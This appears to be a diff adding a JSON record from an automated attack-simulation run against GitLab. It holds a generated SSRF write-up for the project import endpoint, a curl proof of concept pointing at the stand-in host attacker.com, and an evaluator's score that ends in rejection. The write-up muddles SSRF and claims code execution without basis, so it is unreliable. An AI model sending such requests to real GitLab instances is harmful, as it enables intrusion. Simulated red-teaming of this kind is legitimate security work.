@@ -1,0 +1,18 @@
+{
+  "mode": "attack_sim",
+  "program": "GitLab",
+  "iteration": 5,
+  "attack": "TITLE: GitLab Project Import URL SSRF Exploit\nTARGET: POST /api/v4/projects/:id/import\nTECHNIQUE: SSRF via webhook or import URL\nSTEPS:\n1. Craft a malicious import URL that includes a query parameter for the desired project's ID (e.g., `https://example.com/api/v4/projects/12345/import?url=http://attacker.com/target.php?param=secret`). \n2.  Submit this URL to the GitLab import endpoint via POST request with the project ID. \n3.  The import request will likely redirect to the target URL,  potentially executing the script on the target server. \nPROOF OF CONCEPT:\n```bash\ncurl -X POST -H \"Content-Type: application/json\" \\\n-d '{\"url\": \"http://attacker.com/target.php?param=secret\"}' \\\n'https://example.com/api/v4/projects/12345/import'\n```\nEXPECTED IMPACT:  Successful execution of arbitrary code on the target server.\nCONFIDENCE: 0.8",
+  "evaluation": {
+    "score": 0.68,
+    "realistic": true,
+    "in_scope": true,
+    "originality": "medium",
+    "weakness": "The attack relies on the use of a webhook or import URL, which may not be enabled by default in GitLab. Additionally, the target server must have a vulnerable script that can be executed by the import request.",
+    "strength": "The attack demonstrates a realistic payload with actual values and correctly applies the technique to the named endpoint. However, the impact is not specific enough and the confidence is only moderate.",
+    "verdict": "reject"
+  },
+  "score": 0.68,
+  "verdict": "reject",
+  "timestamp": "2026-03-11-012841"
+}
